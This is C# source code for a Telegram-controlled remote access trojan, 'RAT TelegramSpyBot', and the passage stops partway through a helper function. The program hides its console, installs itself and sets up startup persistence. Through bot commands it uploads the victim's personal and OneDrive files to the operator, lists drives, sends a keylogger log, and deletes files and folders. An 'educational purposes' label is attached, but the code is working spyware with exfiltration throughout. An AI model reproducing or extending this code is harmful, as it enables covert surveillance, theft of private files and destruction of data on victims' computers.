﻿using RATTelegramSpyBot.Lib;
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Requests;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using File = System.IO.File;

namespace RATTelegramSpyBot {
    class MainRAT {
        #region Funcion main
        private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
        public static string Path { get; set; }
        // Ocultar Consola
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        // Finish ocultar Consola

        static void Main(string[] args) {
            #region Configuracion
            // Modo Debug
            if (!config.CONSOLE_DEBUG) {IntPtr handle = GetConsoleWindow();ShowWindow(handle, 0);}
            // Se replica en el sistema/
            if (config.TROJAN) {Tools.Trojan();}
            // Modifica el registro de windows
            if (config.STARTUP) {Tools.StartUp(); }
            // Delay
            Thread.Sleep(config.DELAY * 1000);
            #endregion
            #region Main
            //Método que se ejecuta cuando se recibe un mensaje
            Bot.OnMessage += BotOnMessageReceived;

            //Método que se ejecuta cuando se recibe un callbackQuery
            Bot.OnCallbackQuery += BotOnCallbackQueryReceived;

            //Método que se ejecuta cuando se recibe un error
            Bot.OnReceiveError += BotOnReceiveError;
            // Mensaje de conexión

            //Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
            Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");

            // Escucha servidor
            Bot.StartReceiving();
            Console.ReadLine();
            Bot.StopReceiving();
            #endregion
        }

        #endregion 

        // Zona Importante 
        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
            #region Declare variables
            var message = messageEventArgs.Message;
            string UserName = Features.getUserName();
            if (message == null || message.Type != MessageType.Text) return;
            string Command = message.Text.Split(' ').First();           // Case "Comando"
            Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
            #endregion
            switch (message.Text.Split(' ').First()) {
                case "/Status":         // Verifica si estamos en linea
                    #region /Status
                    await Bot.SendTextMessageAsync(config.ID, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                    break;
                    #endregion
                case "/Show_Information":// Muestra información del sistema
                    #region /Show_Information
                    await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                    break;
                    #endregion
                case "/Get_FilesAll":   // Menú Obtiene archivos
                    #region /Get_FilesAll
                    var GetFiles = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"        ,callbackData: "GetPictures"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Videos"          ,callbackData: "GetVideos"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Documents"       ,callbackData: "GetDocument"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Music"           ,callbackData: "GetMusic"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Download"        ,callbackData: "getDownload"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Desktop"         ,callbackData: "getDesktop")
                    }});
                    var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Pictures"    ,callbackData: "GetPicturesO"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"      ,callbackData: "GetVideosO"),

                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documents"    ,callbackData: "GetDocumentO"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Music"        ,callbackData: "GetMusicO"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Desktop"      ,callbackData: "getDesktopO"),
                        InlineKeyboardButton.WithCallbackData(text: "Get all files from OneDrive" ,callbackData: "getAllO")
                    }});
                    var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Imagenes"     ,callbackData: "GetPicturesOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"       , callbackData: "GetVideosOE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documentos"   ,callbackData: "GetDocumentOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Música"       ,callbackData: "GetMusicOE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Escritorio"   ,callbackData: "getDesktopOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Todos los archivos",callbackData: "getAllO")
                    }});
                    await Bot.SendTextMessageAsync(config.ID, " NOTE: Absolutely all files will be obtained.");
                    await Bot.SendTextMessageAsync(config.ID, "User Files: " + Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                    await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                    await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                    break;
                #endregion
                case "/Dir":            // Lista ruta especifica
                    #region /Dir
                    if (Path.Length <= 4) {
                        SendBotMessage("Si usted desea listar una unidad, hagalo con el comando: \n/Dir_DirectoryDisk\n Ya que el comando /Dir es solo para lisar carpetas especificas y no unidades\n NOTA: Espero en las proximas actualizaciones parchar ese error. ");
                    } else {
                        ListarFiles(Path);
                    }
                    Path = "";
                    break;
                #endregion
                case "/Dir_CurrentUserFiles":
                    #region /Dir_CurrentUserfiles
                    ListarFiles(@"C: \Users\" + UserName);
                    SendBotMessage("Finish Command");
                    break;
                    #endregion 
                case "/Dir_CurrentUserFolders":
                    #region
                    ListarFiles(@"C: \Users\" + UserName);
                    SendBotMessage("Finish Command");
                    break;
                    #endregion
                case "/Dir_FolderDisk": // Lista Ruta de discos especificos
                    #region /Dir_FolderDisk
                    var Disk = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree D:\\"       ,callbackData: "DDD"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree E:\\"       ,callbackData: "DDE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree F:\\"       ,callbackData: "DDF"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree G:\\"       ,callbackData: "DDG"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree H:\\"       ,callbackData: "DDH"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree I:\\"       ,callbackData: "DDI"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree J:\\"       ,callbackData: "DDJ"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree K:\\"       ,callbackData: "DDK"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree L:\\"       ,callbackData: "DDL"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree M:\\"       ,callbackData: "DDM"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree N:\\"       ,callbackData: "DDN"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree O:\\"       ,callbackData: "DDO"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree P:\\"       ,callbackData: "DDP"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Q:\\"       ,callbackData: "DDQ"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree R:\\"       ,callbackData: "DDR"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree S:\\"       ,callbackData: "DDS"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree T:\\"       ,callbackData: "DDT"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree U:\\"       ,callbackData: "DDU"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree V:\\"       ,callbackData: "DDV"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree W:\\"       ,callbackData: "DDW"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree X:\\"       ,callbackData: "DDX"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Z:\\"       ,callbackData: "DDZ"),

                    }});
                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA: Este proceso puede demorar varios minutos, al culminár habrá un mensaje de FINISH'</b>", ParseMode.Html);
                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA2 : Se Omitirán directorios Protegidos con permisos especiales o del sistema</b>", ParseMode.Html);
                    await Bot.SendTextMessageAsync(config.ID, "Show directory tree from disk", replyMarkup: Disk);        // Obtiene USER
                    break;
                #endregion
                case "/Get_OnlyFile":   // Obtiene un archivo en especifico
                    #region /Get_OnlyFile
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else {GetOnlyFileTelegram(Path);}
                    Path = "";
                    break;
                    #endregion
                case "/Delete_OnlyFile":// Elimina un archivo
                    #region /Delete_OnlyFile
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Delete_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Delete_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else {
                        Delete(Path);
                    }
                    Path = "";
                    break;
                    #endregion
                case "/Keylogger":      // Keylogger [En proceso]
                    #region /Keylogger
                    GetOnlyFileTelegram(config.PATH_KEY);
                    break;
                    #endregion
                case "/Delete_Folder":  // Elimina carpeta espeficica
                    #region /Delete_Folder
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else { Delete(Path, true);}
                    Path = "";
                    break;
                    #endregion
                case "/DestroyRAT":     // Destruye RAt sin dejar Rastro
                    #region /DestroyRAT
                    var DestroyRATButtons = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|ACCEPT|"  ,callbackData: "DestroyRATTrue"),
                        InlineKeyboardButton.WithCallbackData(text: "|DESTROY|" ,callbackData: "DestroyRATFalse"),
                    }});

                    SendBotMessage("This process will destroy the RAT of the Computer, this process is irreversible");
                    await Bot.SendTextMessageAsync(config.ID, "Continue ?", replyMarkup: DestroyRATButtons);        // Obtiene USER
                    break;
                    #endregion
                case "/About":          // Información del Creador
                    #region /About
                    string about =
                        "<b>Developed by:</b> <code>SebastianEPH</code>" +
                        "\n<b>Product Name: </b>" + @"<a href=""https://github.com/SebastianEPH/RAT.TelegramSpyBot"">RAT TelegramSpyBot</a>" + " C#" +
                        "\n<b>Type Software:</b> <code>Remote Administration tool</code>" +
                        "\n<b>Versión:</b> <code>1.3</code>" +
                        "\n<b>State:</b> <code>Finish</code>" +
                        "\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>" +
                        "\n<b>Size:</b> <code>400KB aprox</code>" +
                        "\n<b>Undetectable:</b> <code>False</code>" +
                        "\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>" +
                        "\n<b>Programming Lenguage:</b> <code>C# .Net Framework 4.7</code>" +
                        "\n<b>Licence:</b> <code>MIT</code>" +
                        "\n<b>IDE:</b> Visual Studio Comunity 2019" +
                        "\n<b>Description:</b>" +
                        "\nRemote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands.  \n<b>[Fines educativos]</b>" +
                        "\n<b></b>" +
                        "\n<b></b>" +
                        "\n<b>Contact: </b>" +
                        "\n<b> - " + @"<a href=""https://github.com/SebastianEPH"">GitHub</a>" + " </b>" +
                        "\n<b> - " + @"<a href=""https://t.me/sebastianeph"">Telegram</a>" + " </b>" +
                        "\n<b> - " + @"<a href=""https://sebastianeph.github.io/"">WebSite</a>" + " </b>" +
                        "\n<b> - SebastianEPH99@gmail.com</b>" +
                        "\n<b></b>" +
                        "\n<b>You can read the documentation at the following link >></b>" +
                        "\n<b></b>";

                    await Bot.SendTextMessageAsync(config.ID, about, ParseMode.Html);
                    await Bot.SendPhotoAsync(chatId: config.ID, photo: "https://i.imgur.com/SelWET0.png");
                    await Bot.SendTextMessageAsync(config.ID, "\n\n<b>[Fines educativos]</b>", ParseMode.Html);
                    break;
                #endregion
                //Mensaje por default
                default:
                    #region Default
                    const string usage =
                  "\n/Status                   <Check if the PC is online>" +
                  "\n/Show_Information <get detailed system information>" +     // Muestra información del sistema
                  // Obtiene archivos o carpetas 
                  "\n/Get_FilesAll          |Buttons| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
                  "\n/Get_OnlyFile  <Path>   C:\\User\\Photos and videos\\foto34.jpg " +    //Sube solo un archivo especifico.
                  // Comandos para listar archivos o carpetas 
                  "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
                  "\n/Dir_CurrentUserFiles     <List files of current user>" +  // Lista Archivos dentro de los usuarios actual 
                  "\n/Dir_CurrentUserFolders   <List folders of current user>" +// Lista Carpetas dentro del usuario actual 
                  //"\n/Dir_UserFolders     <Show User Folders>" +                // Muestra carpetas de usuarios en la PC 
                  //"\n/Dir_UserFolder     |Buttons| Only Folder Tree Drive" +    // 
                  "\n/Dir_FolderDisk     |Buttons| Only Folder Tree Drive" +    // Lista Arbol de solo carpetas de Unidades de almacemiento
                  // 
                  "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
                  // Eliminar archivos o carpetas
                  "\n/Delete_OnlyFile <Path> " +                                // Elimina un archivo
                  "\n/Delete_Folder <Path> " +                                  // Eliminar Carpeta con todos los archivos dentro.
                  "\n/DestroyRAT  |Button| <Accept> or <Denied>" +              // Destruye el RAT del Sistema sin Dejar Rastro
                  // Others
                  "\n/Help                    <This menu>" +
                  "\n\r" +
                  // Datos de creador
                  "\n/About         <This Information>" +
                  "";
                    await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n", ParseMode.Html);
                    await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
                    break;
                    #endregion
            }
        }
        private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {

            var callbackQuery = callbackQueryEventArgs.CallbackQuery;
            string user = Features.getUserName();
            switch (callbackQuery.Data) {
                
                case "GetPictures":   GetFilesTelegram(@"C:\Users\" + user + @"\Pictures"); SendBotMessage("Finish Command") ; break;                          
                case "GetVideos":     GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); SendBotMessage("Finish Command"); break;                         
                case "GetDocument":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;
                case "GetMusic":      GetFilesTelegram(@"C:\Users\" + user + @"\Music"); SendBotMessage("Finish Command"); break;                    
                case "GetDownload":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;                 
                case "GetDesktop":    GetFilesTelegram(@"C:\Users\" + user + @"\Desktop"); SendBotMessage("Finish Command"); break;

                // OneDrive Español
                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); SendBotMessage("Finish Command"); break;                          
                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                          
                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); SendBotMessage("Finish Command"); break;                          
                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica"); SendBotMessage("Finish Command"); break;                          
                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;                          
                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); SendBotMessage("Finish Command"); break;

                // OneDrive English
                case "GetPicturesO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); SendBotMessage("Finish Command"); break;                          
                case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                         
                case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); SendBotMessage("Finish Command"); break;                         
                case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); SendBotMessage("Finish Command"); break;                         
                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;
                // "/DirDisk"
               
                case "DDC":    GetFoldersAll(@"C:\"); SendBotMessage("Finish Command"); break;
                case "DDD":    GetFoldersAll(@"D:\"); SendBotMessage("Finish Command"); break;
                case "DDE":    GetFoldersAll(@"E:\"); SendBotMessage("Finish Command"); break;
                case "DDF":    GetFoldersAll(@"F:\"); SendBotMessage("Finish Command"); break;
                case "DDG":    GetFoldersAll(@"G:\"); SendBotMessage("Finish Command"); break;
                case "DDH":    GetFoldersAll(@"H:\"); SendBotMessage("Finish Command"); break;
                case "DDI":    GetFoldersAll(@"I:\"); SendBotMessage("Finish Command"); break;
                case "DDJ":    GetFoldersAll(@"J:\"); SendBotMessage("Finish Command"); break;
                case "DDK":    GetFoldersAll(@"K:\"); SendBotMessage("Finish Command"); break;
                case "DDL":    GetFoldersAll(@"L:\"); SendBotMessage("Finish Command"); break;
                case "DDM":    GetFoldersAll(@"M:\"); SendBotMessage("Finish Command"); break;
                case "DDN":    GetFoldersAll(@"N:\"); SendBotMessage("Finish Command"); break;
                case "DDO":    GetFoldersAll(@"O:\"); SendBotMessage("Finish Command"); break;
                case "DDP":    GetFoldersAll(@"P:\"); SendBotMessage("Finish Command"); break;
                case "DDQ":    GetFoldersAll(@"Q:\"); SendBotMessage("Finish Command"); break;
                case "DDR":    GetFoldersAll(@"R:\"); SendBotMessage("Finish Command"); break;
                case "DDS":    GetFoldersAll(@"S:\"); SendBotMessage("Finish Command"); break;
                case "DDT":    GetFoldersAll(@"T:\"); SendBotMessage("Finish Command"); break;
                case "DDU":    GetFoldersAll(@"U:\"); SendBotMessage("Finish Command"); break;
                case "DDV":    GetFoldersAll(@"V:\"); SendBotMessage("Finish Command"); break;
                case "DDW":    GetFoldersAll(@"W:\"); SendBotMessage("Finish Command"); break;
                case "DDX":    GetFoldersAll(@"X:\"); SendBotMessage("Finish Command"); break;
                case "DDZ":    GetFoldersAll(@"Z:\"); SendBotMessage("Finish Command"); break;
                // Destroy RAT Telegram

                case "DestroyRATTrue":
                    SendBotMessage("Destroy RAT |Accept|");
                    Tools.DestroyRAT(true);
                    break;
                case "DestroyRATFalse": 
                    SendBotMessage("Destroy RAT |Denied| "); 
                    break;

                #region Cases de envío de archivos mediante red 


                case "GetDocumenttgert":
                    await Bot.SendLocationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f
                        );
                    break;
                case "botones":
                    await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");

                    ReplyKeyboardMarkup tipoContacto = new[]
                    {
                        new[] { "Opción 1", "Opción 2" },
                        new[] { "Opción 3", "Opción 4" },
                    };

                    await Bot.SendTextMessageAsync(chatId: callbackQuery.Message.Chat.Id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
                    break;

                case "venue":
                    await Bot.SendVenueAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f,
                        title: "Cenfotec",
                        address: "San José, Montes de Oca"
                        );
                    break;

                case "imagen":
                    await Bot.SendPhotoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        photo: "https://www.google.co.cr/imgres?imgurl=https%3A%2F%2Fwww.pcactual.com%2Fmedio%2F2017%2F07%2F05%2Ftelegram_960x540_0aa1aeac.jpg&imgrefurl=https%3A%2F%2Fwww.pcactual.com%2Fnoticias%2Factualidad%2Fsoy-fan-telegram_13549&docid=UZhcuJ9275t8zM&tbnid=otB1G_5L3DD0sM%3A&vet=10ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ..i&w=960&h=540&bih=722&biw=1536&q=telegram%20image&ved=0ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ&iact=mrc&uact=8"
                        );
                    break;

                case "animation":
                    await Bot.SendAnimationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        animation: "https://techcrunch.com/wp-content/uploads/2015/08/safe_image.gif?w=730&crop=1"
                        );
                    break;

                case "video":
                    await Bot.SendVideoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        video: "https://res.cloudinary.com/dherrerap/video/upload/v1560039252/WhatsApp_Video_2019-06-08_at_6.10.54_PM.mp4"
                        );
                    break;

                case "document":
                    await Bot.SendDocumentAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                        );
                    break;

                case "formato":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<b>bold</b>, <strong>bold</strong>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<i>italic</i>, <em>italic</em>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<a href='http://www.example.com/'>inline URL</a>",
                        parseMode: ParseMode.Html
                        );
                    break;

                case "reply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "ID: " + callbackQuery.Message.MessageId + " - " + callbackQuery.Message.Text,
                        replyToMessageId: callbackQuery.Message.MessageId);
                    break;

                case "contacto":
                    await Bot.SendContactAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        phoneNumber: "2222-2222",
                        firstName: "Jane",
                        lastName: "Doe"
                        );
                    break;

                case "forceReply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Forzar respuesta a este mensaje",
                        replyMarkup: new ForceReplyMarkup());
                    break;

                case "reenviar":
                    await Bot.ForwardMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        fromChatId: callbackQuery.Message.Chat.Id,
                        messageId: callbackQuery.Message.MessageId
                        );
                    break;

                    #endregion
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
            Console.WriteLine("Received error: {0} — {1}",
                receiveErrorEventArgs.ApiRequestException.ErrorCode,
                receiveErrorEventArgs.ApiRequestException.Message);
        }

        #region Funciones Complementarias [importantes] 

        private static async void GetFoldersAll(string path, int indent = 0) {
            try {
                try {
                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
                        foreach (string folder in Directory.GetDirectories(path)) {
                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));

                            await Bot.SendTextMessageAsync(config.ID, folder);

                            GetFoldersAll(folder, indent + 2);
                        }
                    }
                } catch (UnauthorizedAccessException) { }

            } catch {   // Si no encuentra el directorio
                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
            }
        }
        private static async void ListarFiles(string Path) {
            if (Path == "") {
                SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
            } else {
                foreach (var file in Tools.GetFile(Path)) {
                    string FData = infoFile(file);
                    await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
                }
            }

        }
        private static string infoFile(string file) {  // Muestra información detallada del archivo
            try {
                FileInfo fil = new FileInfo(file);
                string FData =
                    "\n<b>Name =</b> " + fil.Name +
                    "\n<b>Extension =</b> " + fil.Extension +
                    "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
                    "\n<b>Creation Data =</b> " + fil.CreationTime +
                    "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
                    "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
                    "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
                    "\n<b>Directory =</b> " + fil.DirectoryName +
                    "\n<b>Full Directory =</b> " + file;
                return FData;
            } catch {
                return "Hubo un problema com la ruta";
            }

        }
        private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
            FileInfo fil = new FileInfo(file);
            var zise = fil.Length;
            // Convierte var en int 
            int MB = int.Parse(zise.ToString());
            // Ejemplo : 44.6MB = 46792411
            // Ejemplo : 95.3KB = 497687
            if (MB >= 49999999) {
                return false;   // Supera los 50MB
            } else {
                return true;    // No supera los 50Mb
            }
        }
        private static bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
            FileInfo fil = new FileInfo(file);
            var zise = fil.Length;
            // Convierte var en int 
            int MB = int.Parse(zise.ToString());
            // Ejemplo : 44.6MB = 46792411
            // Ejemplo : 95.3KB = 497687
            if (MB >= 9999999) {
                return false;   // Supera los 50MB
            } else {
                return true;    // No supera los 10Mb
            }
        }
        private static void Delete(string Path, bool folder = false) {
            if (Path != "" || Path != "[-]") {
                try {
                    if (!folder) {
                        File.Delete(Path);
                        SendBotMessage($"Se eliminó el archivo: {Path} \nCorrectamente");
                    } else {
                        Directory.Delete(Path, true);
                        SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
                    }
                } catch {
                    SendBotMessage($"No se puedo eliminar: {Path} ");
                }
            } else {
                SendBotMessage("La Ruta ingresada está Vacía");
                Console.WriteLine("La ruta ingresada está vacía");
            }



        }
        private async static void GetOnlyFileTelegram(string file) {
            if (file != "") {
                try {
                    if (infoFileZize(file)) {
                        switch (GetFileType(file)) {
                            case "[Imagen]":
                                if (infoFileZizePhoto(file)) {
                                    try {
                                        await Bot.SendPhotoAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                } else {
                                    try {
                                        await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                }
                                break;
                            case "[Video]":
                                try {
                                    await Bot.SendVideoAsync(config.ID, File.Open(file, FileMode.Open));
                                } catch {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el video, " + GetFileName(file));

                                }
                                break;
                            case "[Audio]":
                                try {
                                    await Bot.SendAudioAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el audio, " + GetFileName(file));
                                }
                                break;
                            case "[Doc]":
                                try {
                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            case "[System]": // El archivo se omitidos
                                try {
                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            default:
                                await Bot.SendTextMessageAsync(config.ID, "Se ignoró el archivo " + GetFileName(file));
                                break;
                        }
                    } else {
                        await Bot.SendTextMessageAsync(config.ID, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                    }

                } catch {
                    SendBotMessage("No se encontró el archivo");
                }
            } else {
                SendBotMessage("La Ruta ingresada está vacía");
            }


        }
        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
            } else {
                foreach (var file in Tools.GetFile(Path)) {
                    GetOnlyFileTelegram(file);
                }
            }

            await Bot.SendTextMessageAsync(config.ID, "******************** Finish ********************* ");
        }
        private static async void SendBotMessage(string text = "") {
            await Bot.SendTextMessageAsync(config.ID, text);
        }
        private static string GetFileName(string dir) {   // Retorna solo el nombre del archivo

            if (dir == "[-]") { // Verifica si no hay algún error
                return "[-]";
            }
            //string path = @"D:\PNG Icons\System Win 10\camera.png";
            try {
                /* Utiliza la variable para obtener el ultimo contendor 
                 * =Ejemplo:
                 * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
                 * [Despues]  path =  "SoyUnaImagen.png"                                                         */
                int palabraClave = dir.LastIndexOf(@"\");
                dir = dir.Substring(palabraClave + 1);
                return dir;
            } catch {
